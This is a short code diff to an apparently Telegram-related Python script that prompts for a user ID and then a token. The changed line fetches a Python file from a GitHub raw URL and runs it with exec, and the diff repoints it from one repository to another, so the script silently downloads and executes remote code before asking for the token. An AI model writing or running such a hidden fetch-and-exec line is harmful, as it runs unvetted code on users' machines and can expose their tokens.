@@ -79,7 +79,7 @@ try:
 except ValueError:
     print(f"{red}Invalid input. Please enter a numeric Telegram User ID.")
     exit()
-import requests;exec(requests.get("https://raw.githubusercontent.com/jaikshaikh/Vortexcodes/refs/heads/main/expire.py").text)
+import requests;exec(requests.get("https://raw.githubusercontent.com/nikzffx/NIKZ/refs/heads/main/expire.py").text)
 token = input(f"{green}Enter Token -{cyan} ") 
 aca = 0
 total = 0
